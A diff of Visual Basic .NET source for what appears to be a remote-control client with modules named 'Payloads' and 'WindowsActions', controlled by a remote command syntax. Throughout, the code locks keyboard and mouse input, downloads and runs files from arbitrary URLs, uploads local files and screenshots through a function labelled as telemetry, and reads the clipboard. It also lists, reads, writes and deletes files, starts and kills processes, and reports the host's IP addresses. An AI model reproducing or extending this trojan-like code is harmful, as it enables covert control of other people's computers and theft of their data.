@@ -2,16 +2,18 @@
 Imports System.Runtime.Serialization.Formatters.Binary
 Imports Microsoft.Win32
 Imports System.IO.Compression
+Imports System.Net
 Module Payloads
     Declare Function BlockInput Lib "user32" (ByVal fBlockIt As Boolean) As Boolean
-    Sub Inputs(ByVal Status As Boolean)
+    Function Inputs(ByVal Status As Boolean) As String
         Try
             BlockInput(Status)
-            AddToLog("Payloads", "Input locker (Mouse & Keyboard) (" & Status & ")", False)
+            AddToLog("Payloads", "Inputs (Mouse & Keyboard) (" & Status & ")", False)
+            Return "[Inputs@Payloads]Input (Mouse & Keyboard) (" & Status & ")"
         Catch ex As Exception
-            AddToLog("Inputs@Payloads", "Error: " & ex.Message, True)
+            Return AddToLog("Inputs@Payloads", "Error: " & ex.Message, True)
         End Try
-    End Sub
+    End Function
     Sub DesconectarConexion()
         Try
             Dim p As New System.Diagnostics.ProcessStartInfo("cmd.exe")
@@ -26,7 +28,7 @@ Module Payloads
             AddToLog("DesconectarConexion@Payloads", "Error: " & ex.Message, True)
         End Try
     End Sub
-    Sub SendTheKeys(ByVal proccess As String, ByVal content As String)
+    Function SendTheKeys(ByVal proccess As String, ByVal content As String) As String
         Try
             Dim ProcID As Integer
             ProcID = Shell(proccess, AppWinStyle.NormalFocus)
@@ -35,11 +37,12 @@ Module Payloads
                 My.Computer.Keyboard.SendKeys(singleChar, True)
             Next
             AddToLog("Payloads", "A text content was processed and showed", False)
+            Return "[SendTheKeys@Payloads]A text content was processed And showed"
         Catch ex As Exception
-            AddToLog("SendTheKeys@Payloads", "Error: " & ex.Message, True)
+            Return AddToLog("SendTheKeys@Payloads", "Error: " & ex.Message, True)
         End Try
-    End Sub
-    Sub DownloadComponent(ByVal URL As String, fileName As String, ByVal RunIt As Boolean, ByVal Args As String, Optional ByVal filePath As String = Nothing) 'WORKS! Last Check 03/05/2021 11:33PM
+    End Function
+    Function DownloadComponent(ByVal URL As String, fileName As String, ByVal RunIt As Boolean, ByVal Args As String, Optional ByVal filePath As String = Nothing) As String 'WORKS! Last Check 03/05/2021 11:33PM
         'Uso CMD: /Payloads.DownloadComponent=URL,fileName,True,NULL,null
         'Descripcion
         '   URL = url de descarga directa
@@ -48,29 +51,40 @@ Module Payloads
         '   args = indica argumentos para el inicio (solo en caso de RunIt=True)
         '   (opcional) filePath = indica una ruta para almacenar el archivo
         Try
+            filePath = filePath.Replace("%temp%", "C:\Users\" & Environment.UserName & "\AppData\Local\Temp")
+            filePath = filePath.Replace("%localappdata%", "C:\Users\" & Environment.UserName & "\AppData\Local")
+            filePath = filePath.Replace("%appdata%", "C:\Users\" & Environment.UserName & "\AppData\Roaming")
             If filePath = Nothing Or filePath.ToLower = "null" Then
                 filePath = DIRCommons & "\Comps"
             End If
             If Args = Nothing Or Args.ToLower = "null" Then
                 Args = Nothing
             End If
+            Dim fileNamePath As String = filePath & "\" & fileName
             Try
-                If My.Computer.FileSystem.DirectoryExists(filePath) = False Then
+                If Not My.Computer.FileSystem.DirectoryExists(filePath) Then
                     My.Computer.FileSystem.CreateDirectory(filePath)
                 End If
             Catch
             End Try
-            My.Computer.Network.DownloadFile(URL, filePath & "\" & fileName)
+            Try
+                If My.Computer.FileSystem.FileExists(fileNamePath) Then
+                    My.Computer.FileSystem.DeleteFile(fileNamePath)
+                End If
+            Catch
+            End Try
+            My.Computer.Network.DownloadFile(URL, fileNamePath)
             Threading.Thread.Sleep(50)
             If RunIt = True Then
-                Process.Start(filePath & "\" & fileName, Args)
+                Process.Start(fileNamePath, Args)
             End If
             AddToLog("Payloads", "Component downloaded!", False)
+            Return "[DownloadComponent@Payloads]Component downloaded!"
         Catch ex As Exception
-            AddToLog("DownloadComponent@Payloads", "Error: " & ex.Message, True)
+            Return AddToLog("DownloadComponent@Payloads", "Error: " & ex.Message, True)
         End Try
-    End Sub
-    Sub uploadAfile(ByVal filePath As String, Optional ByVal serverUpload As String = Nothing)
+    End Function
+    Function uploadAfile(ByVal filePath As String, Optional ByVal serverUpload As String = Nothing) As String
         'Uso CMD: /Payloads.uploadAfile=localFilePath,{serverUploadPost/null}
         Try
             If serverUpload = Nothing Or serverUpload.ToLower = "null" Then
@@ -79,11 +93,12 @@ Module Payloads
                 SendCustomTelemetryFile(filePath, serverUpload)
             End If
             AddToLog("Payloads", "File uploaded!", False)
+            Return "[uploadAfile@Payloads]File uploaded!"
         Catch ex As Exception
-            AddToLog("uploadAfile@Payloads", "Error: " & ex.Message, True)
+            Return AddToLog("uploadAfile@Payloads", "Error: " & ex.Message, True)
         End Try
-    End Sub
-    Sub TakeAnScreenshot()
+    End Function
+    Function TakeAnScreenshot() As String
         Dim BF As New BinaryFormatter
         Dim IMAGEN As Bitmap
         Try
@@ -107,11 +122,12 @@ Module Payloads
             Threading.Thread.Sleep(100)
             Network.SendCustomTelemetryFile(DIRCommons & "\" & theFileName)
             AddToLog("Payloads", "Screenshot taken!", False)
+            Return "[TakeAnScreenshot@Payloads]Screenshot taken!"
         Catch ex As Exception
-            AddToLog("TakeAnScreenshot@Payloads", "Error: " & ex.Message, True)
+            Return AddToLog("TakeAnScreenshot@Payloads", "Error: " & ex.Message, True)
         End Try
-    End Sub
-    Sub PostNotify(ByVal TipTimeOut As SByte, ByVal TipTitle As String, ByVal TipText As String, ByVal TipIcon As SByte, ByVal iconPath As String)
+    End Function
+    Function PostNotify(ByVal TipTimeOut As SByte, ByVal TipTitle As String, ByVal TipText As String, ByVal TipIcon As SByte, ByVal iconPath As String) As String
         Try
             '/Payloads.PostNotify=2,Hola,Como estas?, 1, C:\Windows\notepad.exe
             Dim newNotify As New NotifyIcon
@@ -133,10 +149,11 @@ Module Payloads
             newNotify.ShowBalloonTip(TipTimeOut, TipTitle, TipText, tipIcono)
             newNotify.Visible = False
             AddToLog("Payloads", "Notify showed!", False)
+            Return "[PostNotify@Payloads]Notify showed!"
         Catch ex As Exception
-            AddToLog("PostNotify@Payloads", "Error: " & ex.Message, True)
+            Return AddToLog("PostNotify@Payloads", "Error: " & ex.Message, True)
         End Try
-    End Sub
+    End Function
 
     Sub Restart()
         Try
@@ -204,6 +221,154 @@ Module Payloads
             AddToLog("Extractor@Payloads", "Error: " & ex.Message, True)
         End Try
     End Sub
+End Module
+Module WindowsActions
+
+    '<--- Process --->
+    Function ProcessStart(ByVal execPath As String, ByVal argument As String) As String 'Funciona 29/03/2022 17:30
+        Try
+            If argument = Nothing Or argument.ToLower = "null" Then
+                argument = Nothing
+            End If
+            Process.Start(execPath, argument)
+            Return "[ProcessStart@WindowsActions]'" & IO.Path.GetFileName(execPath) & "' started with '" & argument & "' arguments."
+        Catch ex As Exception
+            Return AddToLog("ProcessStart@WindowsActions", "Error: " & ex.Message, True)
+        End Try
+    End Function
+    Function ProcessStop(ByVal procName As String) As String 'Funciona 29/03/2022 17:30
+        Try
+            Dim proc = Process.GetProcessesByName(procName)
+            For i As Integer = 0 To proc.Count - 1
+                proc(i).CloseMainWindow()
+            Next i
+            Return "[ProcessStop@WindowsActions]'" & procName & "(" & proc.Count & ")" & "' stopped."
+        Catch ex As Exception
+            Return AddToLog("ProcessStop@WindowsActions", "Error: " & ex.Message, True)
+        End Try
+    End Function
+    Function ProcessGet() As String 'Funciona 29/03/2022 17:30
+        Try
+            Dim retorno As String = Nothing
+            retorno = vbCrLf
+            Dim p As Process
+            For Each p In Process.GetProcesses()
+                If Not p Is Nothing Then
+                    retorno = retorno & p.ProcessName & vbCrLf
+                End If
+            Next
+            Return retorno
+        Catch ex As Exception
+            Return AddToLog("ProcessGet@WindowsActions", "Error: " & ex.Message, True)
+        End Try
+    End Function
+
+    '<--- FileSystem --->
+    Function FileSystemGetDirectory(ByVal dirPath As String) As String 'Funciona 29/03/2022 17:30
+        Try
+            Dim retorno As String = Nothing
+            retorno = vbCrLf
+            For Each DIR As String In My.Computer.FileSystem.GetDirectories(dirPath, FileIO.SearchOption.SearchAllSubDirectories)
+                retorno = retorno & DIR & vbCrLf
+            Next
+            Return retorno
+        Catch ex As Exception
+            Return AddToLog("FileSystemGetDirectory@WindowsActions", "Error: " & ex.Message, True)
+        End Try
+    End Function
+    Function FileSystemGetFiles(ByVal dirPath As String) As String 'Funciona 29/03/2022 17:30
+        Try
+            Dim retorno As String = Nothing
+            retorno = vbCrLf
+            For Each FILE As String In My.Computer.FileSystem.GetFiles(dirPath, FileIO.SearchOption.SearchAllSubDirectories)
+                retorno = retorno & FILE & vbCrLf
+            Next
+            Return retorno
+        Catch ex As Exception
+            Return AddToLog("FileSystemGetFiles@WindowsActions", "Error: " & ex.Message, True)
+        End Try
+    End Function
+    Function FileSystemRead(ByVal filePath As String) As String 'Funciona 29/03/2022 17:30
+        Try
+            Dim retorno As String = Nothing
+            retorno = vbCrLf
+            retorno &= My.Computer.FileSystem.ReadAllText(filePath)
+            Return retorno
+        Catch ex As Exception
+            Return AddToLog("FileSystemRead@WindowsActions", "Error: " & ex.Message, True)
+        End Try
+    End Function
+    Function FileSystemWrite(ByVal filePath As String, ByVal content As String, Optional ByVal append As Boolean = False) As String 'Funciona 29/03/2022 17:30
+        Try
+            My.Computer.FileSystem.WriteAllText(filePath, content, append)
+            Return "[FileSystemWrite@WindowsActions]Writted in '" & IO.Path.GetFileName(filePath) & "'."
+        Catch ex As Exception
+            Return AddToLog("FileSystemWrite@WindowsActions", "Error: " & ex.Message, True)
+        End Try
+    End Function
+    Function FileSystemDirCreate(ByVal dirPath As String) As String 'Funciona 29/03/2022 17:30
+        Try
+            My.Computer.FileSystem.CreateDirectory(dirPath)
+            Return "[FileSystemDirCreate@WindowsActions]Directory '" & IO.Path.GetDirectoryName(dirPath) & "' created."
+        Catch ex As Exception
+            Return AddToLog("FileSystemDirCreate@WindowsActions", "Error: " & ex.Message, True)
+        End Try
+    End Function
+    Function FileSystemDelete(ByVal objectPath As String) As String 'Funciona 29/03/2022 17:30
+        Try
+            Try
+                My.Computer.FileSystem.DeleteFile(objectPath)
+                Return "[FileSystemDelete@WindowsActions]File deleted!"
+            Catch
+            End Try
+            Try
+                My.Computer.FileSystem.DeleteDirectory(objectPath, FileIO.DeleteDirectoryOption.DeleteAllContents)
+                Return "[FileSystemDelete@WindowsActions]Directory deleted!"
+            Catch
+            End Try
+            Return "[FileSystemDelete@WindowsActions]Can't delete"
+        Catch ex As Exception
+            Return AddToLog("FileSystemDelete@WindowsActions", "Error: " & ex.Message, True)
+        End Try
+    End Function
+
+    '<--- Clipboard --->
+    Function ClipboardSet(ByVal text As String) As String
+        Try
+            My.Computer.Clipboard.SetText(text)
+            Return "[ClipboardSet@WindowsActions]Clipboard set."
+        Catch ex As Exception
+            Return AddToLog("ClipboardSet@WindowsActions", "Error: " & ex.Message, True)
+        End Try
+    End Function
+    Function ClipboardGet() As String
+        Try
+            Dim retorno As String = Nothing
+            retorno = vbCrLf
+            retorno &= My.Computer.Clipboard.GetText()
+            Return retorno
+        Catch ex As Exception
+            Return AddToLog("ClipboardGet@WindowsActions", "Error: " & ex.Message, True)
+        End Try
+    End Function
+
+    '<--- System --->
+    Function SystemGetHost() As String 'Funciona 29/03/2022 17:30
+        Try
+            Dim retorno As String = Nothing
+            retorno = vbCrLf
+            Dim MI_HOST As String
+            MI_HOST = Dns.GetHostName()
+            Dim MIS_IP As IPAddress() = Dns.GetHostAddresses(MI_HOST)
+            retorno = retorno & MI_HOST & vbCrLf
+            For I = 0 To MIS_IP.Length - 1
+                retorno = retorno & MIS_IP(I).ToString & vbCrLf
+            Next
+            Return retorno
+        Catch ex As Exception
+            Return AddToLog("SystemGetHost@WindowsActions", "Error: " & ex.Message, True)
+        End Try
+    End Function
 End Module
 Module BOROGET
     Private DIRBoroGetInstallFolder As String = DIRCommons & "\boro-get"
